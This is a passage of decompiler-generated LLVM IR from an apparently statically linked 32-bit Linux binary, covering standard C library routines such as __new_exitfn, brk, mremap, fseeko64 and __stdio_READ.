  br i1 %v1_80581bc, label %dec_label_pc_80581e1.backedge, label %dec_label_pc_80581cf

dec_label_pc_80581e1.backedge:                    ; preds = %dec_label_pc_80581b9, %dec_label_pc_80581c0, %dec_label_pc_80581cf
  %v1_80581ec = icmp eq i32 %v1_80581a6, 0
  %v1_80581ee = icmp eq i1 %v1_80581ec, false
  br i1 %v1_80581ee, label %dec_label_pc_80581a6, label %dec_label_pc_80581e1.dec_label_pc_80581f0_crit_edge

dec_label_pc_80581c0:                             ; preds = %dec_label_pc_80581a6
  %v1_80581c0 = add i32 %v2_80581af, 4
  %v2_80581c0 = inttoptr i32 %v1_80581c0 to i32*
  %v3_80581c0 = load i32, i32* %v2_80581c0, align 4
  %v1_80581c3 = icmp eq i32 %v3_80581c0, 0
  br i1 %v1_80581c3, label %dec_label_pc_80581e1.backedge, label %dec_label_pc_80581c7

dec_label_pc_80581c7:                             ; preds = %dec_label_pc_80581c0
  br label %dec_label_pc_80581dc

dec_label_pc_80581cf:                             ; preds = %dec_label_pc_80581b9
  %v1_80581cf = add i32 %v2_80581af, 4
  %v2_80581cf = inttoptr i32 %v1_80581cf to i32*
  %v3_80581cf = load i32, i32* %v2_80581cf, align 4
  %v1_80581d2 = icmp eq i32 %v3_80581cf, 0
  br i1 %v1_80581d2, label %dec_label_pc_80581e1.backedge, label %dec_label_pc_80581d6

dec_label_pc_80581d6:                             ; preds = %dec_label_pc_80581cf
  br label %dec_label_pc_80581dc

dec_label_pc_80581dc:                             ; preds = %dec_label_pc_80581c7, %dec_label_pc_80581d6
  %v4_80581dc = phi i32 [ %v3_80581cf, %dec_label_pc_80581d6 ], [ %v3_80581c0, %dec_label_pc_80581c7 ]
  call void @__pseudo_call(i32 %v4_80581dc)
  %v0_80581e117 = load i32, i32* @global_var_80673fc.329, align 4
  %v0_80581e618 = load i32, i32* @global_var_8067400.331, align 1024
  %v1_80581ec19 = icmp eq i32 %v0_80581e117, 0
  %v1_80581ee20 = icmp eq i1 %v1_80581ec19, false
  br i1 %v1_80581ee20, label %dec_label_pc_80581a6.lr.ph, label %dec_label_pc_80581f0

dec_label_pc_80581a6.lr.ph:                       ; preds = %entry, %dec_label_pc_80581dc
  %v0_80581e61830 = phi i32 [ %v0_80581e618, %dec_label_pc_80581dc ], [ %v0_80581e61825, %entry ]
  %v0_80581e11729 = phi i32 [ %v0_80581e117, %dec_label_pc_80581dc ], [ %v0_80581e11724, %entry ]
  br label %dec_label_pc_80581a6

dec_label_pc_80581e1.dec_label_pc_80581f0_crit_edge: ; preds = %dec_label_pc_80581e1.backedge
  br label %dec_label_pc_80581f0

dec_label_pc_80581f0:                             ; preds = %entry, %dec_label_pc_80581dc, %dec_label_pc_80581e1.dec_label_pc_80581f0_crit_edge
  %v0_80581e6.lcssa = phi i32 [ %v0_80581e61830, %dec_label_pc_80581e1.dec_label_pc_80581f0_crit_edge ], [ %v0_80581e61825, %entry ], [ %v0_80581e618, %dec_label_pc_80581dc ]
  %v2_80581f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80581f6, i32* @ebx, align 4
  %v1_80581f7 = call i32 @free(i32 %v0_80581e6.lcssa)
  ret i32 %v1_80581f7

; uselistorder directives
  uselistorder i32 %v2_80581af, { 1, 0, 2 }
  uselistorder i32 %v1_80581a6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80581f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80581a6.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80581dc, { 1, 0 }
  uselistorder label %dec_label_pc_80581e1.backedge, { 2, 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v2_805820a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805820a, i32* %stack_var_-44, align 4
  %v4_805820f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134540701, i32 ptrtoint (i32* @global_var_8062a00.265 to i32))
  store i32 ptrtoint (i32* @global_var_8062a00.265 to i32), i32* %stack_var_-44, align 4
  %v1_805821b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062a00.265 to i32))
  %v0_8058220 = load i32, i32* @global_var_80673fc.329, align 4
  %v0_8058225 = load i32, i32* @global_var_8067404.332, align 4
  %v1_805822b = add i32 %v0_8058220, 1
  %v5_8058231 = icmp slt i32 %v0_8058225, %v1_805822b
  br i1 %v5_8058231, label %dec_label_pc_8058233, label %entry.dec_label_pc_805826c_crit_edge

entry.dec_label_pc_805826c_crit_edge:             ; preds = %entry
  %v1_8058286.pre = load i32, i32* @global_var_8067400.331, align 1024
  br label %dec_label_pc_805826c

dec_label_pc_8058233:                             ; preds = %entry
  %v2_8058233 = mul i32 %v0_8058225, 16
  %v1_8058238 = add i32 %v2_8058233, 320
  %v0_805823f = load i32, i32* @global_var_8067400.331, align 1024
  store i32 %v0_805823f, i32* %stack_var_-44, align 4
  %v4_8058245 = inttoptr i32 %v0_805823f to i32*
  %v5_8058245 = call i32 @realloc(i32* %v4_8058245, i32 %v1_8058238, i32 %v1_805822b, i32 %v1_805822b)
  store i32 %v5_8058245, i32* @ebx, align 4
  %v1_805824f = icmp eq i32 %v5_8058245, 0
  %v1_8058251 = icmp eq i1 %v1_805824f, false
  br i1 %v1_8058251, label %dec_label_pc_8058260, label %dec_label_pc_8058253

dec_label_pc_8058253:                             ; preds = %dec_label_pc_8058233
  %v0_8058253 = load i32, i32* %stack_var_-44, align 4
  %v1_8058253 = call i32 @__errno_location(i32 %v0_8058253)
  %v1_8058258 = inttoptr i32 %v1_8058253 to i32*
  store i32 12, i32* %v1_8058258, align 4
  br label %dec_label_pc_8058292

dec_label_pc_8058260:                             ; preds = %dec_label_pc_8058233
  %v0_8058260 = load i32, i32* @global_var_8067404.332, align 4
  %v1_8058260 = add i32 %v0_8058260, 20
  store i32 %v1_8058260, i32* @global_var_8067404.332, align 4
  store i32 %v5_8058245, i32* @global_var_8067400.331, align 1024
  %v0_805826c.pre = load i32, i32* @global_var_80673fc.329, align 4
  br label %dec_label_pc_805826c

dec_label_pc_805826c:                             ; preds = %entry.dec_label_pc_805826c_crit_edge, %dec_label_pc_8058260
  %v1_8058286 = phi i32 [ %v1_8058286.pre, %entry.dec_label_pc_805826c_crit_edge ], [ %v5_8058245, %dec_label_pc_8058260 ]
  %v0_805826c = phi i32 [ %v0_8058220, %entry.dec_label_pc_805826c_crit_edge ], [ %v0_805826c.pre, %dec_label_pc_8058260 ]
  store i32 134578588, i32* @global_var_80672a4.266, align 4
  %v1_805827d = add i32 %v0_805826c, 1
  %v2_805827e = mul i32 %v0_805826c, 16
  store i32 %v1_805827d, i32* @global_var_80673fc.329, align 4
  %v2_8058286 = add i32 %v2_805827e, %v1_8058286
  store i32 %v2_8058286, i32* @ebx, align 4
  %v1_805828c = inttoptr i32 %v2_8058286 to i32*
  store i32 1, i32* %v1_805828c, align 4
  br label %dec_label_pc_8058292

dec_label_pc_8058292:                             ; preds = %dec_label_pc_8058253, %dec_label_pc_805826c
  store i32 %v2_805820a, i32* %stack_var_-44, align 4
  %v3_805829b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v0_80582a0 = load i32, i32* @ebx, align 4
  ret i32 %v0_80582a0

; uselistorder directives
  uselistorder i32 %v5_8058245, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_8067400.331, { 3, 4, 2, 1, 0 }
  uselistorder i32* @global_var_80673fc.329, { 3, 2, 4, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8062a00.265 to i32), { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_8058292, { 1, 0 }
  uselistorder label %dec_label_pc_805826c, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80582a8 = load i32, i32* @eax, align 4
  %v1_80582a8 = add i32 %v0_80582a8, 28
  %v2_80582a8 = inttoptr i32 %v1_80582a8 to i32*
  %v3_80582a8 = load i32, i32* %v2_80582a8, align 4
  store i32 %v3_80582a8, i32* @global_var_8067b60.333, align 32
  %v1_80582b1 = add i32 %v0_80582a8, 44
  %v2_80582b1 = inttoptr i32 %v1_80582b1 to i32*
  %v3_80582b1 = load i32, i32* %v2_80582b1, align 4
  store i32 %v3_80582b1, i32* @global_var_8067b64.334, align 4
  ret i32 %v3_80582b1
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80582bc = load i32, i32* @ebx, align 4
  store i32 %v0_80582bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80582cf = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80582cf, i32* @global_var_8067408.287, align 8
  %v7_80582da = icmp ult i32 %v1_80582cf, %arg1
  %v1_80582dc = icmp eq i1 %v7_80582da, false
  br i1 %v1_80582dc, label %dec_label_pc_80582ec, label %dec_label_pc_80582de

dec_label_pc_80582de:                             ; preds = %entry
  %v0_80582de = load i32, i32* %stack_var_-4, align 4
  %v1_80582de = call i32 @__errno_location(i32 %v0_80582de)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80582e6 = inttoptr i32 %v1_80582de to i32*
  store i32 12, i32* %v1_80582e6, align 4
  %v0_80582ec.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80582ec

dec_label_pc_80582ec:                             ; preds = %entry, %dec_label_pc_80582de
  %v0_80582ec = phi i32 [ 0, %entry ], [ %v0_80582ec.pre, %dec_label_pc_80582de ]
  %v2_80582f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80582f0, i32* @ebx, align 4
  ret i32 %v0_80582ec

; uselistorder directives
  uselistorder i32 %v1_80582cf, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8067408.287, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80582ec, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @edx, align 4
  %v1_80582fd = inttoptr i32 %tmp2 to i32*
  %v2_80582fd = load i32, i32* %v1_80582fd, align 4
  %tmp5 = icmp ult i32 %v2_80582fd, 12
  br i1 %tmp5, label %dec_label_pc_8058329, label %dec_label_pc_8058304

dec_label_pc_8058304:                             ; preds = %entry
  %v1_8058304 = add i32 %v2_80582fd, 3
  %v1_8058307 = and i32 %v1_8058304, -4
  %v2_805830a = add i32 %v1_8058307, %tmp2
  %v1_805830d = add i32 %tmp, 20
  %v2_805830d = inttoptr i32 %v1_805830d to i32*
  %v3_805830d = load i32, i32* %v2_805830d, align 4
  %v2_8058310 = add i32 %tmp, 16
  %v3_8058310 = inttoptr i32 %v2_8058310 to i32*
  %v4_8058310 = load i32, i32* %v3_8058310, align 4
  %v5_8058310 = add i32 %v4_8058310, %v3_805830d
  store i32 %v5_8058310, i32* @edx, align 4
  %v1_8058313 = add i32 %v2_805830a, 12
  %v6_8058318 = icmp ugt i32 %v1_8058313, %v5_8058310
  br i1 %v6_8058318, label %dec_label_pc_8058329, label %dec_label_pc_805831a

dec_label_pc_805831a:                             ; preds = %dec_label_pc_8058304
  %v1_805831a = inttoptr i32 %v2_805830a to i32*
  %v2_805831a = load i32, i32* %v1_805831a, align 4
  %v1_805831c = add i32 %v2_805831a, 3
  %v1_805831f = and i32 %v1_805831c, -4
  %v2_8058322 = add i32 %v1_805831f, %v2_805830a
  %tmp6 = icmp ugt i32 %v2_8058322, %v5_8058310
  br i1 %tmp6, label %dec_label_pc_8058329, label %dec_label_pc_805832b

dec_label_pc_8058329:                             ; preds = %dec_label_pc_805831a, %dec_label_pc_8058304, %entry
  br label %dec_label_pc_805832b

dec_label_pc_805832b:                             ; preds = %dec_label_pc_805831a, %dec_label_pc_8058329
  %v0_805832b = phi i32 [ %v2_805830a, %dec_label_pc_805831a ], [ 0, %dec_label_pc_8058329 ]
  ret i32 %v0_805832b

; uselistorder directives
  uselistorder i32 %v2_805830a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80582fd, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805832b, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8058330 = load i32, i32* @edi, align 4
  %v0_8058331 = load i32, i32* @esi, align 4
  store i32 %v0_8058331, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8058349 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8058351 = call i32 @mremap(i32 %v0_8058349, i32 %v0_8058331, i32 %v0_8058330, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8058349, i32* @ebx, align 4
  store i32 %v6_8058351, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8058351, -4095
  br i1 %tmp, label %dec_label_pc_8058369, label %dec_label_pc_805835d

dec_label_pc_805835d:                             ; preds = %entry
  %v1_805835d = call i32 @__errno_location(i32 %v0_8058349)
  %v0_8058362 = load i32, i32* %esi.global-to-local, align 4
  %v1_8058362 = sub i32 0, %v0_8058362
  %v2_8058364 = inttoptr i32 %v1_805835d to i32*
  store i32 %v1_8058362, i32* %v2_8058364, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058369

dec_label_pc_8058369:                             ; preds = %entry, %dec_label_pc_805835d
  %v0_8058369 = phi i32 [ %v6_8058351, %entry ], [ -1, %dec_label_pc_805835d ]
  %v2_805836c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805836c, i32* @esi, align 4
  store i32 %v0_8058330, i32* @edi, align 4
  ret i32 %v0_8058369

; uselistorder directives
  uselistorder i32 %v6_8058351, { 1, 0, 2 }
  uselistorder i32 %v0_8058349, { 1, 0, 2 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 46, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058369, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805837b = ashr i32 %arg2, 31
  %v4_8058382 = inttoptr i32 %arg1 to i16*
  %v5_8058382 = call i32 @__GI_fseeko64(i16* %v4_8058382, i32 %arg2, i32 %v1_805837b, i32 %arg3)
  ret i32 %v5_8058382
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80583ac = load i32, i32* @ebp, align 4
  %v0_80583ad = load i32, i32* @edi, align 4
  %v0_80583ae = load i32, i32* @esi, align 4
  %v0_80583af = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80583bf = ptrtoint i16* %arg1 to i32
  store i32 %v4_80583bf, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80583e3, label %dec_label_pc_80583d0

dec_label_pc_80583d0:                             ; preds = %entry
  %v1_80583d0 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80583d0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_80583d8 = inttoptr i32 %v1_80583d0 to i32*
  store i32 22, i32* %v1_80583d8, align 4
  br label %dec_label_pc_8058485

dec_label_pc_80583e3:                             ; preds = %entry
  %v1_80583e3 = add i32 %v4_80583bf, 52
  %v2_80583e3 = inttoptr i32 %v1_80583e3 to i32*
  %v3_80583e3 = load i32, i32* %v2_80583e3, align 4
  store i32 %v3_80583e3, i32* @ebp, align 4
  %v1_80583e6 = icmp eq i32 %v3_80583e3, 0
  %v1_80583e8 = icmp eq i1 %v1_80583e6, false
  br i1 %v1_80583e8, label %dec_label_pc_8058409, label %dec_label_pc_80583ea

dec_label_pc_80583ea:                             ; preds = %dec_label_pc_80583e3
  %v1_80583ea = add i32 %v4_80583bf, 56
  store i32 %v1_80583ea, i32* @ebx, align 4
  %v2_80583f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80583f4, i32* %eax.global-to-local, align 4
  %v5_80583f9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134540701, i32 %v1_80583ea)
  store i32 %v5_80583f9, i32* %eax.global-to-local, align 4
  %v0_80583fe = load i32, i32* @ebx, align 4
  %v2_8058401 = call i32 @pthread_mutex_lock(i32 %v0_80583fe)
  store i32 %v2_8058401, i32* %eax.global-to-local, align 4
  %v0_8058409.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058409

dec_label_pc_8058409:                             ; preds = %dec_label_pc_80583e3, %dec_label_pc_80583ea
  %v0_8058411 = phi i32 [ %v4_80583bf, %dec_label_pc_80583e3 ], [ %v0_8058409.pre, %dec_label_pc_80583ea ]
  %v1_8058409 = inttoptr i32 %v0_8058411 to i8*
  %v2_8058409 = load i8, i8* %v1_8058409, align 1
  %v3_8058409 = and i8 %v2_8058409, 64
  %v4_8058409 = icmp eq i8 %v3_8058409, 0
  br i1 %v4_8058409, label %dec_label_pc_805841e, label %dec_label_pc_805840e

dec_label_pc_805840e:                             ; preds = %dec_label_pc_8058409
  %v2_8058412 = call i32 @__stdio_wcommit(i32 %v0_8058411)
  store i32 %v2_8058412, i32* %eax.global-to-local, align 4
  %v1_805841a = icmp eq i32 %v2_8058412, 0
  %v1_805841c = icmp eq i1 %v1_805841a, false
  br i1 %v1_805841c, label %dec_label_pc_805846d, label %dec_label_pc_805841e

dec_label_pc_805841e:                             ; preds = %dec_label_pc_805840e, %dec_label_pc_8058409
  %v0_805841e = load i32, i32* @edi, align 4
  %v9_805841e = icmp eq i32 %v0_805841e, 1
  %v1_8058421 = icmp eq i1 %v9_805841e, false
  br i1 %v1_8058421, label %dec_label_pc_805841e.dec_label_pc_8058437_crit_edge, label %dec_label_pc_8058423

dec_label_pc_805841e.dec_label_pc_8058437_crit_edge: ; preds = %dec_label_pc_805841e
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8058437

dec_label_pc_8058423:                             ; preds = %dec_label_pc_805841e
  %v0_8058423 = load i32, i32* @ecx, align 4
  %v2_8058425 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8058425, i32* %eax.global-to-local, align 4
  %v0_805842a = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_805842a to i32*
  %v6_805842b = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8058425, i32 %v0_8058423, i32 %v0_8058423)
  store i32 %v6_805842b, i32* %eax.global-to-local, align 4
  %v2_8058433 = icmp slt i32 %v6_805842b, 0
  br i1 %v2_8058433, label %dec_label_pc_805846d, label %dec_label_pc_8058423.dec_label_pc_8058437_crit_edge

dec_label_pc_8058423.dec_label_pc_8058437_crit_edge: ; preds = %dec_label_pc_8058423
  %v0_8058438.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8058437

dec_label_pc_8058437:                             ; preds = %dec_label_pc_805841e.dec_label_pc_8058437_crit_edge, %dec_label_pc_8058423.dec_label_pc_8058437_crit_edge
  %v2_8058439.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805841e.dec_label_pc_8058437_crit_edge ], [ %v2_8058425, %dec_label_pc_8058423.dec_label_pc_8058437_crit_edge ]
  %v0_8058438 = phi i32 [ %v0_805841e, %dec_label_pc_805841e.dec_label_pc_8058437_crit_edge ], [ %v0_8058438.pre, %dec_label_pc_8058423.dec_label_pc_8058437_crit_edge ]
  %v0_8058437 = load i32, i32* @edx, align 4
  store i32 %v2_8058439.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805843e = load i32, i32* @esi, align 4
  %v5_805843f = inttoptr i32 %v2_8058439.pre-phi to i32*
  %v6_805843f = call i32 @__stdio_seek(i32 %v0_805843e, i32* %v5_805843f, i32 %v0_8058438, i32 %v0_8058437)
  store i32 %v6_805843f, i32* %eax.global-to-local, align 4
  %v2_8058447 = icmp slt i32 %v6_805843f, 0
  br i1 %v2_8058447, label %dec_label_pc_805846d, label %dec_label_pc_805844b

dec_label_pc_805844b:                             ; preds = %dec_label_pc_8058437
  %v0_805844b = load i32, i32* @esi, align 4
  %v1_805844b = inttoptr i32 %v0_805844b to i16*
  %v2_805844b = load i16, i16* %v1_805844b, align 2
  %v3_805844b = and i16 %v2_805844b, -72
  store i16 %v3_805844b, i16* %v1_805844b, align 2
  %v0_805844f = load i32, i32* @esi, align 4
  %v1_805844f = add i32 %v0_805844f, 8
  %v2_805844f = inttoptr i32 %v1_805844f to i32*
  %v3_805844f = load i32, i32* %v2_805844f, align 4
  store i32 %v3_805844f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v2_8058454 = add i32 %v0_805844f, 16
  %v3_8058454 = inttoptr i32 %v2_8058454 to i32*
  store i32 %v3_805844f, i32* %v3_8058454, align 4
  %v0_8058457 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058457 = load i32, i32* @esi, align 4
  %v2_8058457 = add i32 %v1_8058457, 20
  %v3_8058457 = inttoptr i32 %v2_8058457 to i32*
  store i32 %v0_8058457, i32* %v3_8058457, align 4
  %v0_805845a = load i32, i32* %eax.global-to-local, align 4
  %v1_805845a = load i32, i32* @esi, align 4
  %v2_805845a = add i32 %v1_805845a, 24
  %v3_805845a = inttoptr i32 %v2_805845a to i32*
  store i32 %v0_805845a, i32* %v3_805845a, align 4
  %v0_805845d = load i32, i32* %eax.global-to-local, align 4
  %v1_805845d = load i32, i32* @esi, align 4
  %v2_805845d = add i32 %v1_805845d, 28
  %v3_805845d = inttoptr i32 %v2_805845d to i32*
  store i32 %v0_805845d, i32* %v3_805845d, align 4
  %v0_8058460 = load i32, i32* @esi, align 4
  %v1_8058460 = add i32 %v0_8058460, 44
  %v2_8058460 = inttoptr i32 %v1_8058460 to i32*
  store i32 0, i32* %v2_8058460, align 4
  %v0_8058467 = load i32, i32* @esi, align 4
  %v1_8058467 = add i32 %v0_8058467, 2
  %v2_8058467 = inttoptr i32 %v1_8058467 to i8*
  store i8 0, i8* %v2_8058467, align 1
  br label %dec_label_pc_8058470

dec_label_pc_805846d:                             ; preds = %dec_label_pc_8058437, %dec_label_pc_8058423, %dec_label_pc_805840e
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_8058470

dec_label_pc_8058470:                             ; preds = %dec_label_pc_805844b, %dec_label_pc_805846d
  br i1 %v1_80583e8, label %dec_label_pc_8058485, label %dec_label_pc_8058474

dec_label_pc_8058474:                             ; preds = %dec_label_pc_8058470
  %v2_8058478 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8058478, i32* %eax.global-to-local, align 4
  %v4_805847d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_805847d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058485

dec_label_pc_8058485:                             ; preds = %dec_label_pc_8058470, %dec_label_pc_80583d0, %dec_label_pc_8058474
  %v0_8058488 = load i32, i32* @ebx, align 4
  store i32 %v0_8058488, i32* %eax.global-to-local, align 4
  store i32 %v0_80583af, i32* @ebx, align 4
  store i32 %v0_80583ae, i32* @esi, align 4
  store i32 %v0_80583ad, i32* @edi, align 4
  store i32 %v0_80583ac, i32* @ebp, align 4
  ret i32 %v0_8058488

; uselistorder directives
  uselistorder i32 %v2_8058439.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805841e, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32 22, { 39, 24, 41, 23, 25, 26, 27, 30, 45, 31, 36, 38, 40, 37, 34, 35, 46, 22, 2, 3, 4, 42, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 28, 14, 44, 15, 16, 29, 17, 1, 18, 19, 20, 21, 43, 32, 33 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058485, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058470, { 1, 0 }
  uselistorder label %dec_label_pc_8058437, { 1, 0 }
  uselistorder label %dec_label_pc_8058409, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058490 = load i32, i32* @ebx, align 4
  store i32 %v0_8058490, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8058496 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058496, i32* @ebx, align 4
  %v1_805849e = bitcast i16* %arg1 to i8*
  %v2_805849e = load i8, i8* %v1_805849e, align 1
  %v3_805849e = and i8 %v2_805849e, 4
  %v4_805849e = icmp eq i8 %v3_805849e, 0
  %v1_80584a1 = icmp eq i1 %v4_805849e, false
  br i1 %v1_80584a1, label %dec_label_pc_80584d0, label %dec_label_pc_80584a3

dec_label_pc_80584a3:                             ; preds = %entry
  %v2_80584a3 = icmp slt i32 %arg3, 0
  %v1_80584a5 = icmp eq i1 %v2_80584a3, false
  br i1 %v1_80584a5, label %dec_label_pc_80584ac, label %dec_label_pc_80584a7

dec_label_pc_80584a7:                             ; preds = %dec_label_pc_80584a3
  br label %dec_label_pc_80584ac

dec_label_pc_80584ac:                             ; preds = %dec_label_pc_80584a3, %dec_label_pc_80584a7
  %v0_80584ad = phi i32 [ %arg3, %dec_label_pc_80584a3 ], [ 2147483647, %dec_label_pc_80584a7 ]
  %v1_80584b2 = add i32 %v4_8058496, 4
  %v2_80584b2 = inttoptr i32 %v1_80584b2 to i32*
  %v3_80584b2 = load i32, i32* %v2_80584b2, align 4
  %v3_80584b5 = call i32 @__libc_read(i32 %v3_80584b2, i32 %arg2, i32 %v0_80584ad)
  store i32 %v3_80584b5, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v3_80584b5, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80584d0, label %dec_label_pc_80584c2

dec_label_pc_80584c2:                             ; preds = %dec_label_pc_80584ac
  %v1_80584bd = icmp eq i32 %v3_80584b5, 0
  %v4_80584c0 = icmp eq i1 %v1_80584bd, false
  %v0_80584ca = load i32, i32* @ebx, align 4
  %v1_80584ca = inttoptr i32 %v0_80584ca to i16*
  %v2_80584ca = load i16, i16* %v1_80584ca, align 2
  br i1 %v4_80584c0, label %dec_label_pc_80584ca, label %dec_label_pc_80584c4

dec_label_pc_80584c4:                             ; preds = %dec_label_pc_80584c2
  %v3_80584c4 = or i16 %v2_80584ca, 4
  store i16 %v3_80584c4, i16* %v1_80584ca, align 2
  %v0_80584d3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80584d0

dec_label_pc_80584ca:                             ; preds = %dec_label_pc_80584c2
  %v3_80584ca = or i16 %v2_80584ca, 8
  store i16 %v3_80584ca, i16* %v1_80584ca, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80584d0

dec_label_pc_80584d0:                             ; preds = %dec_label_pc_80584ac, %entry, %dec_label_pc_80584c4, %dec_label_pc_80584ca
  %v0_80584d3 = phi i32 [ %v3_80584b5, %dec_label_pc_80584ac ], [ 0, %entry ], [ %v0_80584d3.pre, %dec_label_pc_80584c4 ], [ 0, %dec_label_pc_80584ca ]
  %v2_80584d2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80584d2, i32* @ebx, align 4
  ret i32 %v0_80584d3

; uselistorder directives
  uselistorder i16 %v2_80584ca, { 1, 0 }
  uselistorder i32 %v3_80584b5, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 0, 4, 3, 5, 2, 1 }
  uselistorder i32 2147483647, { 1, 3, 2, 4, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80584d0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80584ac, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
